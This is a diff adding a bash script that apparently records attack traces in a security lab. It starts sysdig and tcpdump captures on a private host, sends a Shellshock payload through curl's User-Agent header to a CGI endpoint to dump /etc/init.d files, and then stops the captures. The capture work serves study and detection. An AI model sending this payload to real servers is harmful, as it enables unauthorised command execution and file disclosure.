@@ -1,0 +1,24 @@
+#!/bin/bash
+
+
+for i in {0..2}
+do
+ssh -i ./server.pem softseclab@10.176.147.83  sudo sysdig -w stream-$i.scap -z -s 4096 container.name=target &
+
+ssh -i ./server.pem softseclab@10.176.147.83 sudo nohup tcpdump -i eth0 -s0 -w stream-$i.cap port not 22 and port not 3490 and port not 3492 and port not 3790 and port not 80 >pdump.out &
+
+sleep 5
+curl -k -A "() { :;}; /bin/cat /etc/init.d/*" https://10.176.147.83/cgi-bin/ss2
+
+sleep 4
+
+ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT sysdig 
+ssh -i ./server.pem softseclab@10.176.147.83 sudo killall -s SIGINT tcpdump
+
+
+
+
+
+sleep 4
+done
+
